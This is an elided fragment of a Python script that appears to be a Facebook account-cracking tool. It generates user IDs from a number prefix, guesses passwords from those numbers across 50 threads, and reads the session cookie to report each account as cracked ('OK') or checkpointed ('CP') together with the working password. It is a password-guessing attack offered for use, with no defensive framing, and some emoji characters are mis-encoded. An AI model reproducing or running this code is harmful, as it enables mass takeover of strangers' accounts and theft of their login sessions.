...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;37m SIR M.MOSHIN  +SHOVA DON ITNA W8  ðŸ˜‚')
        print(47*"-")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(' \033[1;32m[MMS-OK ðŸ‡µðŸ‡°]  ' +cid+ ' | ' +ps+  '\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(' \x1b[38;5;208m[MMS-CP ðŸ‡®ðŸ‡³]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r %s[MMS ] [%s|%s]  [OK:%s]  [CP:%s] \r'%(P,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
